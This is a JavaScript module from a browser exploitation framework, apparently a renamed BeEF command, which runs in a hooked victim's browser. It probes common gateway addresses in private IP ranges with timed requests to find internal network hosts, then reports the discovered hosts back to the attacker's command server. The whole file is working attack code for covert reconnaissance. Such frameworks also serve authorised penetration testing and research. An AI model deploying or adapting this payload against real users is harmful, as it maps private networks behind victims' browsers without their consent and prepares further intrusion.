//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  if(!server.browser.isFF() && !server.browser.isC()){
    server.debug("[command #<%= @command_id %>] Browser is not supported.");
    server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", server.are.status_error());
  }

  var min_timeout = 500;
  var ranges = [
    '192.168.0.0',
    '192.168.1.0',
    '192.168.2.0',
    '192.168.10.0',
    '192.168.100.0',
    '192.168.123.0',
    '10.0.0.0',
    '10.0.1.0',
    '10.1.1.0',
    '10.10.10.0',
    '172.16.0.0',
    '172.16.1.0'
  ];

var doScan = function(timeout) {

  var discovered_hosts = [];
  var proto = "http";

  var doRequest = function(host) {
    var d = new Date;
    var xhr = new XMLHttpRequest();
    xhr.timeout = timeout;
    xhr.onreadystatechange = function(){
      if(xhr.readyState == 4){
        var time = new Date().getTime() - d.getTime();
        var aborted = false;
        // if we call window.stop() the event triggered is 'abort'
        // http://www.w3.org/TR/XMLHttpRequest/#event-handlers
        xhr.onabort = function(){
          aborted = true;
        }
        xhr.onloadend = function(){
          if(time < timeout){
            // 'abort' fires always before 'onloadend'
            if(time > 1 && aborted === false){ 
              server.debug('Discovered host ['+host+'] in ['+time+'] ms');
              discovered_hosts.push(host);
            }
          }
        }
      }
    }
    xhr.open("GET", proto + "://" + host, true);
    xhr.send();
  }

  var requests = new Array();
  for (var i = 0; i < ranges.length; i++) {
    // the following returns like 192.168.0.
    var c = ranges[i].split('.')[0]+'.'+
    ranges[i].split('.')[1]+'.'+
    ranges[i].split('.')[2]+'.';
    // for every entry in the 'ranges' array, request
    // the most common gateway IPs, like:
    // 192.168.0.1, 192.168.0.100, 192.168.0.254
    requests.push(c + '1');
    requests.push(c + '100');
    requests.push(c + '254');
  }

  // process queue
  var count = requests.length;
  server.debug("[command #<%= @command_id %>] Identifying LAN hosts ("+count+" URLs) (Timeout " + timeout + "ms)");
  var check_timeout = (timeout * count + parseInt(timeout,10));
  var handle = setInterval(function() {
    if (requests.length > 0) {
      doRequest(requests.pop());
    }
  }, timeout);

  // check for results
  checkResults = function() {

    if (handle) {
      server.debug("[command #<%= @command_id %>] Killing timer [ID: " + handle + "]");
      clearInterval(handle);
      handle = 0;
    }

    var hosts = discovered_hosts.join(",");
    server.debug("Discovered " + discovered_hosts.length + " hosts: " + hosts);
    if (discovered_hosts.length >= 5) { 
      // if we get 5+ results something probably went wrong. this happens sometimes.
      if (timeout > min_timeout) {
        // if timeout is more than 500ms then decrease timeout by 500ms and try again
        server.debug("Returned large hit rate (" + discovered_hosts.length + " of " + count + ") indicating low network latency. Retrying scan with decreased timeout (" + (timeout - 500) + "ms)");
        doScan(timeout-500);
      } else {
        server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unexpected results&hosts="+hosts, server.are.status_error());
      }
    } else if (discovered_hosts.length == 0) {
      server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no results", server.are.status_error());
    } else {
      server.debug("[command #<%= @command_id %>] Identifying LAN hosts completed.");
      server.net.send('<%= @command_url %>', <%= @command_id %>, 'hosts='+hosts, server.are.status_success());
      server.net.send("<%= @command_url %>", <%= @command_id %>, "result=scan complete");
    }
  }
  setTimeout("checkResults();", check_timeout);

}

var timeout = "<%= @timeout %>";
if (isNaN(timeout) || timeout < 1) timeout = min_timeout;
doScan(parseInt(timeout,10));

});
